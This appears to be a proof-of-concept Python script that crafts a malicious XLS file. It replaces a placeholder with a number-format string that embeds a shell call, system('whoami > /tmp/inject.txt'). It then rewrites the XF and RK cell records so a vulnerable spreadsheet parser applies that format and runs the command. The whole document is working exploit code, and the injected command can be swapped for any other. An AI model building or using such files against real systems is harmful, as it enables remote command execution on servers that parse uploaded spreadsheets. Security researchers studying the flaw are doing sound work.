xls = open('test.xls', 'rb').read()

# Inject shell to format string
shell = "system('whoami > /tmp/inject.txt')"
fmtStr = f'[>123;{shell}]123'
pattern = f'"{"a" * (len(fmtStr) - 2)}"'
print(pattern)

l = xls.index(pattern.encode())
assert l != -1 #Pattern must exist
r = l + len(pattern)

fmtIdx = xls[l - 5:l - 3]
payload_len = len(fmtStr)

xls = xls[:l] + fmtStr.encode() + xls[r:]

# Apply format string to xf
XF_opcode_w_len = b'\xe0\x00\x14\x00' # Assume highest BIFF version
l = xls.index(XF_opcode_w_len) # First means format index = 0
assert l != -1 # XF must exist
xls = xls[:l + 6] + fmtIdx + xls[l + 8:]

# Apply format to cell
RK_opcode = b'\x7e\x02'
l = xls.index(RK_opcode)
assert l != -1 # Date must exist
l += 8

xls = xls[:l] + b'\x00\x00' + xls[l + 2:] # format index 0

open('test.xls', 'wb').write(xls)
